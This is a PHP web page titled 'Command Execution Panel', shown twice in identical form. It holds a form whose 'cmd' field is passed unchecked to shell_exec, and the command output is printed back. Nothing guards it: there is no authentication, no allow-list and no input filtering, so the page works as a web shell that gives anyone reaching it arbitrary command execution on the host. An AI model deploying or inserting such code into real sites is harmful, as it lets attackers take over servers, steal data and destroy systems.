<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Command Panel</title>
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
  <style>
    body {
      background-color: #0d0d0d;
      color: #00ff99;
      font-family: 'Share Tech Mono', monospace;
      padding: 40px;
    }
    h1 {
      text-align: center;
      font-size: 28px;
      margin-bottom: 40px;
    }
    form, .box {
      max-width: 600px;
      margin: auto;
      background: #111;
      padding: 20px;
      border: 2px solid #00ff99;
      border-radius: 8px;
    }
    input, button {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      background: #0f0f0f;
      color: #00ff99;
      border: 1px solid #00ff99;
      border-radius: 4px;
    }
    button:hover {
      background: #00ff99;
      color: #0f0f0f;
      cursor: pointer;
    }
    pre {
      background-color: #000;
      padding: 10px;
      border-radius: 5px;
      color: #00ff99;
      overflow-x: auto;
    }
  </style>
</head>
<body>
  <h1> Command Execution Panel </h1>

  <form method="POST">
    <label>Enter </label>
    <input type="text" name="cmd" placeholder="python -V" required>
    <button type="submit">Run Command</button>
  </form>

  <?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['cmd'])) {
      $cmd = $_POST['cmd'];
      $output = shell_exec($cmd . ' 2>&1');
      echo '<div class="box" style="margin-top: 30px;">';
      echo "<h2>Output:</h2><pre>" . htmlspecialchars($output) . "</pre>";
      echo '</div>';
  }
  ?>
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Command Panel</title>
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
  <style>
    body {
      background-color: #0d0d0d;
      color: #00ff99;
      font-family: 'Share Tech Mono', monospace;
      padding: 40px;
    }
    h1 {
      text-align: center;
      font-size: 28px;
      margin-bottom: 40px;
    }
    form, .box {
      max-width: 600px;
      margin: auto;
      background: #111;
      padding: 20px;
      border: 2px solid #00ff99;
      border-radius: 8px;
    }
    input, button {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      background: #0f0f0f;
      color: #00ff99;
      border: 1px solid #00ff99;
      border-radius: 4px;
    }
    button:hover {
      background: #00ff99;
      color: #0f0f0f;
      cursor: pointer;
    }
    pre {
      background-color: #000;
      padding: 10px;
      border-radius: 5px;
      color: #00ff99;
      overflow-x: auto;
    }
  </style>
</head>
<body>
  <h1> Command Execution Panel </h1>

  <form method="POST">
    <label>Enter </label>
    <input type="text" name="cmd" placeholder="python -V" required>
    <button type="submit">Run Command</button>
  </form>

  <?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['cmd'])) {
      $cmd = $_POST['cmd'];
      $output = shell_exec($cmd . ' 2>&1');
      echo '<div class="box" style="margin-top: 30px;">';
      echo "<h2>Output:</h2><pre>" . htmlspecialchars($output) . "</pre>";
      echo '</div>';
  }
  ?>
</body>
</html>
